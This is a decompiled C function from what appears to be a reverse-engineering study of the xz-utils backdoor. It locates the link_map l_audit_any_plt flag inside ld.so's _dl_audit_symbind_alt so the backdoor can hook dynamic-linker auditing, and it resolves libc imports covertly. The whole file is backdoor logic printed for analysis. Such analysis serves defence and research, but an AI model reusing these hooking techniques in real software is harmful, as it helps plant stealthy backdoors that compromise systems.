// /home/kali/xzre-ghidra/xzregh/104EE0_find_link_map_l_audit_any_plt.c
// Function: find_link_map_l_audit_any_plt @ 0x104EE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt(backdoor_data_handle_t * data, ptrdiff_t libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Primes an `instruction_search_ctx_t` before invoking the bitmask helper. It sweeps `_dl_audit_symbind_alt` for the LEA that
 * materialises `link_map::l_name` using the caller-provided displacement, records which registers capture the pointer versus the
 * mask, initialises the register filters/output buffers, and then calls `find_link_map_l_audit_any_plt_bitmask`. Success means
 * both the byte offset and AND mask are now stored in `hooks->ldso_ctx`; failure either means the pattern never appeared or the
 * bit was already non-zero.
 */

#include "xzre_types.h"

BOOL find_link_map_l_audit_any_plt
               (backdoor_data_handle_t *data,ptrdiff_t libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  u32 register_mask_snapshot;
  u64 uVar3;
  BOOL success;
  lzma_allocator *allocator;
  pfn_write_t write_stub;
  pfn_pselect_t pselect_stub;
  long lVar7;
  uchar lea_target_reg;
  dl_audit_symbind_alt_fn audit_cursor;
  u8 *lea_disp;
  dasm_ctx_t *pdVar10;
  instruction_search_ctx_t *piVar11;
  undefined4 *puVar12;
  uchar mask_register;
  dl_audit_symbind_alt_fn audit_end;
  byte bVar14;
  undefined4 local_c8;
  undefined4 local_c4;
  instruction_search_ctx_t local_c0;
  dasm_ctx_t local_80;
  
  bVar14 = 0;
  success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,FALSE);
  if (success != FALSE) {
    libc_imports = imported_funcs->libc;
    pdVar10 = &local_80;
    for (lVar7 = 0x16; lVar7 != 0; lVar7 = lVar7 + -1) {
      *(undefined4 *)&pdVar10->instruction = 0;
      pdVar10 = (dasm_ctx_t *)((long)pdVar10 + (ulong)bVar14 * -8 + 4);
    }
    local_c8 = 0;
    local_c4 = 0;
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libc;
    write_stub = (pfn_write_t)lzma_alloc(0x380,allocator);
    register_mask_snapshot = local_c4;
    libc_imports->write = write_stub;
    if (write_stub != (pfn_write_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    audit_cursor = (hooks->ldso_ctx)._dl_audit_symbind_alt;
    local_c8._0_3_ = CONCAT12(0xff,(undefined2)local_c8);
    local_c8 = CONCAT22(local_c8._2_2_,(undefined2)local_c8) | 0x80;
    local_c4._0_2_ = (ushort)local_c4 | 2;
    audit_end = audit_cursor + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
    local_c4._3_1_ = SUB41(register_mask_snapshot,3);
    local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
    pselect_stub = (pfn_pselect_t)lzma_alloc(0x690,allocator);
    libc_imports->pselect = pselect_stub;
    if (pselect_stub != (pfn_pselect_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    while ((audit_cursor < audit_end &&
           (success = x86_dasm(&local_80,(u8 *)audit_cursor,(u8 *)audit_end),
           uVar3 = local_80.instruction_size, success != FALSE))) {
      if ((local_80._40_4_ == 0x1036) &&
         ((((ushort)local_80.prefix._0_4_ & 0x140) == 0x140 &&
          ((byte)(local_80.prefix._13_1_ - 1) < 2)))) {
        mask_register = 0;
        if ((local_80.prefix._0_4_ & 0x40) == 0) {
          lea_target_reg = 0;
          if ((((local_80.prefix._0_4_ & 0x1040) != 0) &&
              (lea_target_reg = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0)
              ) && (lea_target_reg = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
            lea_target_reg = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
          }
        }
        else {
          lea_target_reg = local_80.prefix.decoded.flags & 0x20;
          if ((local_80.prefix._0_4_ & 0x20) == 0) {
            mask_register = local_80.prefix._15_1_;
            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
              lea_target_reg = local_80.prefix._14_1_;
            }
          }
          else {
            mask_register = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
            lea_target_reg = 0;
            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
              lea_target_reg = (char)local_80.prefix.decoded.rex * '\x02' & 8U | local_80.prefix._14_1_;
            }
          }
        }
        if ((local_80.prefix._0_4_ & 0x100) != 0) {
          lea_disp = (u8 *)local_80.mem_disp;
          if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
            lea_disp = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
          }
          if ((lea_disp < (ulong)libname_offset) && (lea_disp != (u8 *)0x0)) {
            piVar11 = &local_c0;
            for (lVar7 = 0x10; lVar7 != 0; lVar7 = lVar7 + -1) {
              *(undefined4 *)&piVar11->start_addr = 0;
              piVar11 = (instruction_search_ctx_t *)((long)piVar11 + (ulong)bVar14 * -8 + 4);
            }
            if (((int)(local_c8 & 0xffff) >> (mask_register & 0x1f) & 1U) == 0) {
              if (((int)(local_c4 & 0xffff) >> (mask_register & 0x1f) & 1U) == 0) goto LAB_00104fd8;
              local_c4._0_3_ = CONCAT12(lea_target_reg,(ushort)local_c4);
              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
                *puVar12 = 0;
                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
              }
              local_c0.output_register_to_match = &local_c4;
              local_c0.output_register = (u8 *)&local_c8;
            }
            else {
              local_c8._0_3_ = CONCAT12(lea_target_reg,(undefined2)local_c8);
              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
                *puVar12 = 0;
                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
              }
              local_c0.output_register_to_match = &local_c8;
              local_c0.output_register = (u8 *)&local_c4;
            }
            local_c0.start_addr = (u8 *)(audit_cursor + uVar3);
            local_c0.end_addr = (u8 *)audit_end;
            local_c0.offset_to_match._0_4_ = (int)lea_disp;
            local_c0.hooks = hooks;
            local_c0.imported_funcs = imported_funcs;
            success = find_link_map_l_audit_any_plt_bitmask(data,&local_c0);
            if (success != FALSE) {
              return TRUE;
            }
            if (local_c0.result != FALSE) {
              return FALSE;
            }
          }
        }
      }
LAB_00104fd8:
      audit_cursor = audit_cursor + local_80.instruction_size;
    }
  }
  return FALSE;
}

